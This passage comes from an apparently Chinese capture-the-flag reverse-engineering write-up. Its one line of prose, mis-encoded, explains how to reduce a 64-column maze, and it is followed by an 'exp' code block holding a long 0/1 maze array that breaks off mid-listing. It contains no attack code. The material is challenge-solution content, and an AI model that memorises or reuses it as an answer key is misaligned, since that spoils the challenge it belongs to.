æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªè¿·å®«æœ‰64åˆ—ï¼Œä½†æ˜¯å·¦å³ç§»åŠ¨ä¸€æ¬¡éƒ½æ˜¯ç§»åŠ¨å››ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠè¿·å®«å¤„ç†ä¸€ä¸‹ï¼Œ</p><p>æ¯å››åˆ—åªå–ç¬¬ä¸€åˆ—å·¦å³æœ‰æ•ˆåˆ—</p><h4 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">maze =[</span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    0,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>, </span><br><span class="line"><span class="built_in">    1,</span>   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span 